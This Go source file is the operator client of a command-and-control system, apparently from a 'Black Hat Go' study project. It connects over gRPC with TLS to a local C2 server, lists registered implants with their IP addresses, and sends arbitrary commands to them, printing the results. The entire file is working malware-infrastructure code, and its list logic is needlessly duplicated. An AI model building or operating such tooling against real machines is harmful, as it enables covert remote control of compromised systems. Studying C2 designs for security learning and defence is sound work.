package main

import (
	"blackhatgo/c2c/grpcapi"
	"context"
	"fmt"
	"log"
	"os"

	"github.com/urfave/cli/v3"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AdminClient
	)

	creds, err := credentials.NewClientTLSFromFile("server.crt", "")
	if err != nil {
		log.Fatalln(err)
	}
	opts = append(opts, grpc.WithTransportCredentials(creds))
	// opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if conn, err = grpc.NewClient(fmt.Sprintf("localhost:%d", 9090), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAdminClient(conn)
	var cmd = new(grpcapi.Command)
	cmd.In = os.Args[1]
	ctx := context.Background()

	cmdFlags := &cli.Command{
		Commands: []*cli.Command{
			{
				Flags: []cli.Flag{
					&cli.BoolFlag{
						Name: "list",
					},
				},
				Action: func(ctx context.Context, c *cli.Command) error {
					req := &grpcapi.Empty{}
					implantsList, err := client.ListRegisteredImplants(ctx, req)
					if err != nil {
						return err
					}
					if len(implantsList.Implants) == 0 {
						fmt.Println("No implants")
						return nil
					}
					for _, implant := range implantsList.Implants {
						fmt.Printf("%s - %s\n", implant.Id, implant.IpAddress)
					}
					return nil
				},
			},
		},
	}

	if cmd.In == "list" {
		req := &grpcapi.Empty{}
		implantsList, err := client.ListRegisteredImplants(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if len(implantsList.Implants) == 0 {
			fmt.Println("No implants")
			return
		}
		for _, implant := range implantsList.Implants {
			fmt.Printf("%s - %s\n", implant.Id, implant.IpAddress)
		}
	} else {
		cmd, err = client.RunCommand(ctx, cmd)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(cmd.Out)
	}

	if err := cmdFlags.Run(ctx, os.Args); err != nil {
		log.Fatal(err)
	}
}
